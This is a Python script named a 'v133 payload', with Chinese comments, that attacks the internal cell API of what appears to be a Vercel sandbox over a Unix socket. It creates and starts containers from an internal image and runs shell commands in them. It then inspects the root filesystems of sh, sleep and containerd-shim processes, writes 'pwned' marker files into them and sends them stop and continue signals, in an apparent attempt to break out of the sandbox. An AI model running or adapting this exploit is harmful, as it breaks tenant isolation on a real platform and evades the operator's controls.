# -*- coding: utf-8 -*-
"""v133 payload: Exec 成功后解剖所有 sh/sleep 进程（不对比）-> 判定 Exec 进程与容器 init 的真实环境
输出 /vercel/sandbox/v133c.out"""
import socket, struct, time, json, os, signal, threading

OUT = '/vercel/sandbox/v133c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(240)

CELL = '/run/cell/cell.sock'
CTRS = '/vercel.hive.cell.api.containers.v1.ContainersService'
PROC = '/vercel.hive.cell.api.processes.v1.ProcessService'
IMG = '977805900156.dkr.ecr.us-east-1.amazonaws.com/sandbox-controller@sha256:95fd06013f4e1708be914dc973663ab50e48d0045087340cc71cf903e2841b59'


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def connect_unix(sockpath, path, body, t=6.0, ctype='application/json'):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n'
               % (path, ctype, len(body))).encode() + body
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        status = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        return status, d[hdr_end + 4:hdr_end + 4 + 500] if hdr_end > 0 else b''
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


def scan_all():
    out = {}
    try:
        for d in os.listdir('/proc'):
            if d.isdigit():
                try:
                    out[int(d)] = open('/proc/%s/comm' % d).read().strip()
                except Exception:
                    pass
    except Exception:
        pass
    return out


def pinfo(pid):
    res = []
    try:
        v = open('/proc/%d/cmdline' % pid, 'rb').read()[:400].replace(b'\x00', b' ')
        res.append('cmdline=%r' % v.decode(errors='replace'))
    except Exception as e:
        res.append('cmdline=EXC %s' % e)
    try:
        res.append('cgroup=' + open('/proc/%d/cgroup' % pid).read().replace('\n', ' | ')[:300])
    except Exception as e:
        res.append('cgroup=EXC %s' % e)
    try:
        st = open('/proc/%d/status' % pid).read()[:800]
        res.append('status=' + '|'.join(l for l in st.splitlines() if l.startswith(('Name:', 'NSpid:', 'CapEff:', 'Seccomp:', 'Uid:'))))
    except Exception as e:
        res.append('status=EXC %s' % e)
    return ' '.join(res)


def dissect(pid, tag):
    log('--- dissect[%s] PID %d ---' % (tag, pid))
    try:
        v = open('/proc/%d/root/proc/1/cmdline' % pid, 'rb').read()[:300].replace(b'\x00', b' ')
        log('PID %d root/proc/1/cmdline=%r' % (pid, v.decode(errors='replace')))
    except Exception as e:
        log('PID %d root/proc/1 EXC %s' % (pid, e))
    try:
        log('PID %d root/ls=%s' % (pid, os.listdir('/proc/%d/root' % pid)[:40]))
    except Exception as e:
        log('PID %d root/ls EXC %s' % (pid, e))
    try:
        h = open('/proc/%d/root/etc/hostname' % pid).read().strip()
        log('PID %d hostname=%r' % (pid, h))
    except Exception as e:
        log('PID %d hostname EXC %s' % (pid, e))
    try:
        log('PID %d root/tmp ls=%s' % (pid, os.listdir('/proc/%d/root/tmp' % pid)[:20]))
    except Exception as e:
        log('PID %d root/tmp EXC %s' % (pid, e))
    for mp in ['tmp/V133M', 'etc/V133M', 'V133M', 'root/V133M']:
        try:
            with open('/proc/%d/root/%s' % (pid, mp), 'w') as mf:
                mf.write('pwned-%d' % pid)
            r = open('/proc/%d/root/%s' % (pid, mp)).read().strip()
            log('PID %d marker root/%s=%r' % (pid, mp, r))
        except Exception as e:
            log('PID %d root/%s EXC %s' % (pid, mp, e))
    try:
        os.kill(pid, 0)
        log('PID %d alive, sending SIGSTOP' % pid)
        os.kill(pid, signal.SIGSTOP)
        time.sleep(0.3)
        try:
            os.kill(pid, 0)
            log('PID %d SIGSTOP ok (still exists)' % pid)
            os.kill(pid, signal.SIGCONT)
            log('PID %d SIGCONT sent' % pid)
        except OSError:
            log('PID %d gone after SIGSTOP' % pid)
    except Exception as e:
        log('PID %d signal EXC %s' % (pid, e))


def so_try(pid, results):
    try:
        preq = b'\x0a' + bytes([len(pid)]) + pid.encode() + b'\x10\x01'
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(12)
        s.connect(CELL)
        env1 = b'\x00' + struct.pack('>I', len(preq)) + preq
        req = ('POST %s/StreamOutput HTTP/1.1\r\nHost: unix\r\nContent-Type: application/connect+proto\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\n\r\n' % (PROC, len(env1))).encode() + env1
        s.sendall(req)
        s.shutdown(socket.SHUT_WR)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        results['so'] = (d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP', d[-1200:])
        log('SO %s body=%r' % results['so'])
    except Exception as e:
        results['so'] = ('EXC %s' % type(e).__name__, b'')
        log('SO EXC %s' % e)


# 1: Create + Start + 立即 Exec（无前置扫描延迟）
log('=== 1 create-start-exec ===')
st, pay = connect_unix(CELL, '%s/Create' % CTRS, json.dumps({'image': IMG}).encode(), t=12)
cid = None
try:
    cid = json.loads(pay.decode()).get('containerId')
except Exception:
    pass
log('Create -> %s cid=%s' % (st, cid))
if not cid:
    f.close()
    raise SystemExit
st, pay = connect_unix(CELL, '%s/Start' % CTRS, json.dumps({'containerId': cid}).encode(), t=8)
log('Start -> %s' % st)

CMD = "echo V133EXEC; id; hostname; pwd; uname -a; cat /proc/1/cmdline 2>&1 | head -c 300; echo; ls / 2>&1 | head -30; cat /proc/self/cgroup; echo ===; sleep 300"
pid = None
for attempt in range(12):
    st, pay = connect_unix(CELL, '%s/Exec' % CTRS,
                           json.dumps({'containerId': cid, 'process': {'args': ['/bin/sh', '-c', CMD]}}).encode(), t=6)
    if '200' in st:
        log('Exec ok @try%d -> %s %r' % (attempt, st, pay[:300]))
        try:
            pid = json.loads(pay.decode()).get('processId')
        except Exception:
            pass
        break
    time.sleep(0.02)
if not pid:
    log('Exec all failed, last %s' % st)
log('processId=%s' % pid)

# 2: 解剖所有 sh/sleep（不对比）
log('=== 2 scan sh/sleep ===')
snap = scan_all()
for p, c in sorted(snap.items()):
    if c in ('sh', 'sleep', 'containerd-shim'):
        log('FOUND PID %d comm=%s' % (p, c))
        log('FOUND PID %d: %s' % (p, pinfo(p)))
        dissect(p, 'all')

# 3: StreamOutput（若 Exec 成功）
log('=== 3 stream ===')
sores = {}
if pid:
    t1 = threading.Thread(target=so_try, args=(pid, sores))
    t1.start()
    t1.join(16)

# 4: 再扫描（流期间/之后）
log('=== 4 rescan ===')
time.sleep(1)
snap2 = scan_all()
for p, c in sorted(snap2.items()):
    if c in ('sh', 'sleep'):
        log('RESCAN PID %d comm=%s' % (p, c))
        if p not in snap:
            dissect(p, 'new')

# cleanup
st, pay = connect_unix(CELL, '%s/Kill' % CTRS, json.dumps({'containerId': cid}).encode(), t=3)
log('Cleanup Kill -> %s' % st)

log('V133_DONE')
f.close()
